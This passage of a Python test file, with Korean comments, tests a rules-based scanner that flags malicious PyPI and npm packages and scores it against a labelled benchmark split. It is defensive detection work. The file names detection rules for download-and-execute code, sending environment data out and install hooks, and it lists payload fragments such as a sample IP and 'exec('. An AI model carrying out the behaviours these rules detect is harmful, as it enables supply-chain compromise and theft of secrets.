        self.assertEqual(got[0]["noCode"], {"rows": 2, "detected": 0})

    def test_top_rules_count_samples_by_label(self):
        self.assertEqual(self.rep["topRules"], [
            {"rule": "R_HIGH", "severity": "HIGH", "malicious": 3, "benign": 2, "strongMalicious": 3, "strongBenign": 1},
            {"rule": "R_LOW", "severity": "LOW", "malicious": 2, "benign": 1, "strongMalicious": 0, "strongBenign": 0}])
        self.assertEqual([t["rule"] for t in rules_layer.report(self.rows, self.results, top=1)["topRules"]], ["R_HIGH"])
        self.assertEqual((self.rep["truncatedSamples"], self.rep["ms"]), (1, {"total": 260, "median": 10, "max": 10}))

    def test_nothing_checked_means_nothing_detected(self):
        rep = rules_layer.report(self.rows, {})
        c = rep["candidates"]
        self.assertEqual(len(c), 1)                                               # 점수가 없으면 점수형 후보도 없다
        self.assertEqual({k: c[0]["all"][k] for k in ("tp", "fn", "fp", "tn")}, {"tp": 0, "fn": 6, "fp": 0, "tn": 20})
        self.assertEqual((rep["results"]["missing"], rep["topRules"]), (28, []))

    def test_report_prints_as_table_and_json(self):
        text = rules_layer.format_report(self.rep, "train")
        for part in ("train 구간", "코드 있는 악성 6 + 정상 20", "코드 없는 악성 2", "오류 1 · 결과 없음 1", "R-strong", "R-score>=45",
                     "50.00%", "5.00%", "pypi", "npm", "1/2", "R_HIGH", "보정 구간에서 따로 고른다"):
            self.assertIn(part, text)
        self.assertIn("점수형 후보 없음", rules_layer.format_report(rules_layer.report(self.rows, {}), "train"))
        self.assertEqual(json.loads(json.dumps(self.rep, ensure_ascii=False)), self.rep)


@NEEDS_ENGINE
class Layer(unittest.TestCase):
    """이전 프로젝트 엔진을 그 자리에서 불러 합성 표본에 돌린다."""

    @classmethod
    def setUpClass(cls):
        cls.engine = rules_layer.Engine()

    def check(self, data):
        got = rules_layer.analyze(self.engine, data)
        self.assertEqual((got["status"], got["why"]), ("ok", ""))
        return got

    def test_engine_is_the_earlier_one_with_all_its_rules(self):
        self.assertEqual(len(self.engine.rules), 71)
        self.assertEqual(sum(1 for r in self.engine.rules if r.detector == "py_flow"), 3)   # 파이썬 AST 흐름 분석
        here = os.path.realpath(rules_layer.ENGINE_DIR)                          # 복사본이 아니라 legacy/ 의 그 파일
        self.assertTrue(os.path.realpath(sys.modules["app.static.engine"].__file__).startswith(here + os.sep))
        self.assertEqual(str(sys.modules["app.static.rules_loader"].RULES_DIR), os.path.join(here, "rules"))

    def test_download_and_execute_in_setup_py_is_caught(self):
        got = self.check(MAL_PYPI)
        self.assertLessEqual({"AST_DOWNLOAD_TO_EXEC", "NET_OUTBOUND_IN_INSTALL"}, set(got["strong"]))
        self.assertEqual((got["score"], got["level"], got["files"], got["truncatedFiles"]), (100, "HIGH", 1, 0))
        flow = [h for h in got["hits"] if h["rule"] == "AST_DOWNLOAD_TO_EXEC"]
        self.assertEqual(flow, [{"rule": "AST_DOWNLOAD_TO_EXEC", "severity": "CRITICAL", "category": "DOWNLOAD_EXECUTE",
                                 "file": "evil-pkg-1.0.3/setup.py", "count": 1, "test": False, "doc": False}])

    def test_sending_environment_out_is_caught(self):
        self.assertLessEqual({"AST_SENSITIVE_TO_NET", "ENV_PLUS_NET"}, set(self.check(MAL_EXFIL)["strong"]))
        npm = self.check(MAL_NPM)
        self.assertLessEqual({"INSTALL_HOOK_ADDED", "SYSINFO_TO_NET"}, set(npm["strong"]))
        self.assertEqual(sorted({h["file"] for h in npm["hits"]}), ["index.js", "package.json"])

    def test_plain_packages_have_no_strong_rule(self):
        for data in (BENIGN_SDIST, BENIGN_NPM):
            got = self.check(data)
            self.assertEqual((got["strong"], got["score"], got["level"]), ([], 0, "LOW"))

    def test_hits_inside_tests_and_docs_are_not_strong(self):
        got = self.check(BENIGN_WITH_TESTS)
        where = {(h["rule"], h["file"]): (h["test"], h["doc"]) for h in got["hits"]}
        self.assertEqual(where[("AST_DOWNLOAD_TO_EXEC", "tests/test_fetch.py")], (True, False))
        self.assertEqual(where[("AST_SENSITIVE_TO_NET", "docs/example.py")], (False, True))
        self.assertEqual(got["strong"], [])
        self.assertGreater(got["score"], 0)                                      # 점수에는 낮은 배수로 들어간다

    def test_cut_at_20kb_is_recorded_and_the_rest_is_not_seen(self):
        filler = b"x = 1\n" * 4000                                               # 24KB
        tail = self.check(tar_bytes({"big-1.0/big/mod.py": filler + DOWNLOAD_EXEC}))
        self.assertEqual((tail["truncatedFiles"], tail["files"], tail["strong"], tail["hits"]), (1, 1, [], []))
        head = self.check(tar_bytes({"big-1.0/big/mod.py": DOWNLOAD_EXEC + filler, "big-1.0/big/small.py": b"x = 1\n"}))
        self.assertEqual((head["truncatedFiles"], head["files"]), (1, 2))
        self.assertIn("NET_RAW_IP_URL", head["strong"])

    def test_no_code_from_the_sample_is_kept(self):
        got = self.check(MAL_PYPI)
        text = json.dumps(got, ensure_ascii=False)
        for piece in ("203.0.113.7", "stage2", "urlopen", "exec("):
            self.assertNotIn(piece, text)
        self.assertTrue(all(set(h) == {"rule", "severity", "category", "file", "count", "test", "doc"} for h in got["hits"]))

    def test_same_input_gives_the_same_result(self):
        for data in (MAL_PYPI, MAL_EXFIL, MAL_NPM, BENIGN_WITH_TESTS):
            a, b = self.check(data), rules_layer.analyze(rules_layer.Engine(), data)
            a.pop("ms"), b.pop("ms")
            self.assertEqual(json.dumps(a, sort_keys=True), json.dumps(b, sort_keys=True))

    def test_end_to_end_run_and_report(self):
        c = Corpus(self)
        mal = [c.add(MAL_PYPI, name="evil-pkg"), c.add(MAL_EXFIL, name="evil-two"),
               c.add(MAL_NPM, ecosystem="npm", name="evil-npm"),
               c.add(UNREADABLE, name="broken", codeLines=4),                                     # 읽지 못함 — 분모에 남고 못 잡음
               c.add(zip_bytes({"empty-1.0/README.md": b"# nothing\n"}), name="empty")]           # 코드 없는 악성 — 따로
        c.add(BENIGN_SDIST, label="benign", name="plain", form="sdist")
        c.add(BENIGN_NPM, ecosystem="npm", label="benign", name="ok", form="tarball")
        c.add(BENIGN_WITH_TESTS, label="benign", name="lib", form="sdist")                        # 시험 · 문서 안의 탐지뿐 — 오탐이 아니다
        c.add(zip_bytes({"held-1.0/setup.py": DOWNLOAD_EXEC}), name="held", part="test")          # 봉인 구간 — 고르지 않는다
        rows, folder = c.select()
        self.assertEqual(len(rows), 8)
        self.assertEqual(rules_layer.run(self.engine, rows, folder, c.out()), 8)
        self.assertEqual(rules_layer.run(self.engine, rows, folder, c.out("again.jsonl")), 8)
        self.assertEqual(without_ms(c.out()), without_ms(c.out("again.jsonl")))                   # 같은 입력이면 같은 결과
        self.assertEqual(rules_layer.run(self.engine, rows, folder, c.out()), 0)                  # 이어받기 — 다시 하지 않는다

        got = rules_layer.read_results(c.out())
        self.assertEqual((got[mal[3]["id"]]["status"], got[mal[3]["id"]]["why"]), ("error", "압축을 읽지 못함"))
        rep = rules_layer.report(rows, got)
        self.assertEqual((rep["main"], rep["noCodeMalicious"]), ({"malicious": 4, "benign": 3}, 1))
        self.assertEqual(rep["results"], {"ok": 7, "error": 1, "missing": 0, "errors": {"압축을 읽지 못함": 1}})
        strong = rep["candidates"][0]
        self.assertEqual({k: strong["all"][k] for k in ("tp", "fn", "fp", "tn")}, {"tp": 3, "fn": 1, "fp": 0, "tn": 3})
        self.assertEqual((strong["all"]["detection"], strong["all"]["fpr"], strong["noCode"]), (0.75, 0.0, {"rows": 1, "detected": 0}))
        self.assertEqual({k: strong["npm"][k] for k in ("tp", "fn", "fp", "tn")}, {"tp": 1, "fn": 0, "fp": 0, "tn": 1})
        self.assertTrue(all(c["budget"] for c in rep["candidates"][1:]))
        self.assertIn("R-strong", rules_layer.format_report(rep, "train"))

    def command(self, *argv):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), mock.patch.object(sys, "argv", ["rules_layer.py", *argv]):
            rules_layer.main()
        return out.getvalue()

    def test_commands_read_and_write_under_the_data_folder(self):
        c = Corpus(self)
        c.add(MAL_PYPI, name="evil-pkg")
        c.add(BENIGN_SDIST, label="benign", name="plain", form="sdist")
        c.add(zip_bytes({"held-1.0/setup.py": DOWNLOAD_EXEC}), name="held", part="test")
        with open(os.path.join(c.dir, "split.json"), "w", encoding="utf-8") as f:
            json.dump(c.split, f)
        with mock.patch.object(split, "SPLIT", os.path.join(c.dir, "split.json")), mock.patch.object(split, "read_ledger", lambda: []), \
                mock.patch.dict(os.environ, {"SG_BENCH_DATA": c.dir}):
            self.assertIn("새로 검사 2", self.command("run"))                      # 기본은 학습 구간
            self.assertIn("새로 검사 0 · 건너뜀(이미 있음) 2", self.command("run"))
            self.assertEqual(sorted(os.listdir(os.path.join(c.dir, "results"))), ["rules-train.jsonl", "rules-train.meta.json"])
            rep = json.loads(self.command("report", "--json"))
            self.assertEqual((rep["part"], rep["rows"], rep["engine"]["rules"], rep["engine"]["engineSha256"]),
                             ("train", 2, 71, rules_layer.engine_sha256()))
            self.assertEqual({k: rep["candidates"][0]["all"][k] for k in ("tp", "fn", "fp", "tn")}, {"tp": 1, "fn": 0, "fp": 0, "tn": 1})
            self.assertIn("R-strong", self.command("report"))
            for argv in (("run", "--part", "test"), ("report", "--part", "reserve")):    # 봉인 구간은 명령에서도 거부
                with self.assertRaises(SystemExit) as stop:
                    self.command(*argv)
                self.assertTrue(str(stop.exception).startswith("거부: 봉인 구간"))
            self.assertEqual(sorted(os.listdir(os.path.join(c.dir, "results"))), ["rules-train.jsonl", "rules-train.meta.json"])


if __name__ == "__main__":
    unittest.main()
